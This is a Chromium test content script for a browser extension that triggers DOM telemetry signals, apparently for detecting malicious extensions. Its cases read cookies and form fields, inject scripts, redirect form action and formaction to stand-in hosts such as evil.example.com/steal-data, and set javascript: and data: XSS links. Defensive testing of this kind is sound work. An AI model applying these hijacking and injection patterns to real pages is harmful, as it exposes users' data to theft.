// Copyright 2026 The Chromium Authors
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// This script contains functions to trigger various TelemetrySignalTypes

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  let status = 'Unknown action';
  try {
    switch (message.action) {
      // --- CATEGORY 1: CONFIDENTIALITY SIGNALS (Data Theft) ---
      case 'readCookie':
        let cookies = document.cookie;
        console.log('Read cookies:', cookies ? 'present' : 'empty');
        status = 'Read Document.cookie';
        break;
      case 'readInput':
        let inputElem = document.getElementById('test-input');
        if (inputElem) {
          let val = inputElem.value;
          console.log('Read input value:', val);
          inputElem.value = 'New value set by extension';
          status = 'Read HTMLInputElement.value';
        } else {
          status = 'Error: Input element not found';
        }
        break;
      case 'readTextarea':
        let textareaElem = document.getElementById('test-textarea');
        if (textareaElem) {
          let val = textareaElem.value;
          console.log('Read textarea value:', val);
          textareaElem.value = 'New text set by extension';
          status = 'Read HTMLTextAreaElement.value';
        } else {
          status = 'Error: Textarea element not found';
        }
        break;

      // --- CATEGORY 2: INTEGRITY SIGNALS (Injection Defense) ---

      // B.1 Remote Script Injection
      case 'addScript':
        let scriptElem = document.createElement('script');
        scriptElem.src = chrome.runtime.getURL('injected.js');
        document.getElementById('script-container')?.appendChild(scriptElem);
        status = 'Added <script src="...">';
        break;
      case 'modifyScript':
        let existingScript = document.getElementById('test-script');
        if (existingScript) {
          existingScript.setAttribute(
              'src', chrome.runtime.getURL('injected.js'));
          status = 'Modified <script src>';
        } else {
          status = 'Error: Script element not found';
        }
        break;

      // B.2 Executable Element Creation
      case 'addIframe':
        let iframeElem = document.createElement('iframe');
        iframeElem.src = 'https://example.com/iframe';
        document.getElementById('iframe-container')?.appendChild(iframeElem);
        status = 'Added <iframe src="...">';
        break;

      // B.3 Attribute-Based Injection
      // a. Form Hijacking (action)
      case 'addForm':
        let formNew = document.createElement('form');
        formNew.action = 'https://evil.example.com/';
        formNew.method = 'POST';
        document.body.appendChild(formNew);
        status = 'Added <form action="...">';
        break;
      case 'modifyFormAction':
        let formElem = document.getElementById('test-form');
        if (formElem) {
          formElem.setAttribute(
              'action', 'https://evil.example.com/steal-data');
          status = 'Modified <form action>';
        } else {
          status = 'Error: Form element not found';
        }
        break;
      // a. Form Hijacking (formaction)
      case 'addButtonFormAction':
        let btnNew = document.createElement('button');
        btnNew.formAction = 'https://evil.example.com/';
        btnNew.type = 'submit';
        btnNew.innerText = 'New Evil Button';
        let fContainer = document.getElementById('test-form');
        if (fContainer) {
          fContainer.appendChild(btnNew);
        } else {
          document.body.appendChild(btnNew);
        }
        status = 'Added <button formaction="...">';
        break;
      case 'modifyFormactionAttr':
        let buttonElem = document.getElementById('test-button');
        if (buttonElem) {
          buttonElem.setAttribute(
              'formaction', 'https://evil.example.com/hijack');
          status = 'Modified <button formaction>';
        } else {
          status = 'Error: Button element not found';
        }
        break;

      // b. Protocol Handlers (javascript: / data:) on href/src
      case 'addLinkJS':
        let aNewJS = document.createElement('a');
        aNewJS.href = 'javascript:alert(2)';
        aNewJS.innerText = 'Added JS Link';
        document.body.appendChild(aNewJS);
        status = 'Added <a href="javascript:">';
        break;
      case 'modifyHrefJS':
        let linkElem = document.getElementById('test-link');
        if (linkElem) {
          linkElem.setAttribute('href', 'javascript:alert(\'xss\')');
          status = 'Modified <a href="javascript:">';
        } else {
          status = 'Error: Link element not found';
        }
        break;
      case 'addHrefData':
        let newLink = document.createElement('a');
        newLink.href = 'data:text/html,<script>alert(1)</script>';
        newLink.innerText = 'Added Data Link';
        document.body.appendChild(newLink);
        status = 'Added <a href="data:">';
        break;
    }
  } catch (e) {
    status = 'Error: ' + e.message;
  }

  sendResponse({status: status});
  return true;
});

console.log('DOM Activity Telemetry Test Content Script loaded.');
